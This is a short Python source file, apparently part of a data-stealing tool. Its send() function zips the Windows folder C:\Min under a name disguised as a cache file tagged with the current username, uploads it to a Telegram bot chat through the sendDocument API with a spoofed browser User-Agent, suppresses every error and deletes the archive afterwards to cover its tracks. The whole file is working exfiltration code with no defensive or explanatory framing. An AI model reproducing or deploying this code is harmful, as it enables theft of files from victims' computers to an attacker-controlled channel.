import getpass
import os
import requests
import shutil
from requests.exceptions import RequestException

def create_zip_archive(source_directory, zip_name):
    try:
        shutil.make_archive(zip_name[:-4], 'zip', source_directory)
    except Exception as e:
        pass

def send(chat_id, token):
    current_user = getpass.getuser()
    source_directory = "C:\\Min"
    my_zip = f"windows__cache_{current_user}.zip"

    create_zip_archive(source_directory, my_zip)

    url = f'https://api.telegram.org/bot{token}/sendDocument?chat_id={chat_id}'
    headers = {
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
        'User-Agent': "Mozilla/5.0 (Windows NT 6.4; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/556.7"
    }

    try:
        if os.path.exists(my_zip):
            with requests.Session() as session:
                session.headers.update(headers)
                with open(my_zip, 'rb') as file:
                    files = {'document': (my_zip, file)}
                    response = session.post(url, files=files)
                    response.raise_for_status()
        else:
            pass
    except RequestException as e:
        pass
    finally:
        try:
            if os.path.exists(my_zip):
                os.remove(my_zip)
            else:
                pass
        except Exception as e:
            pass
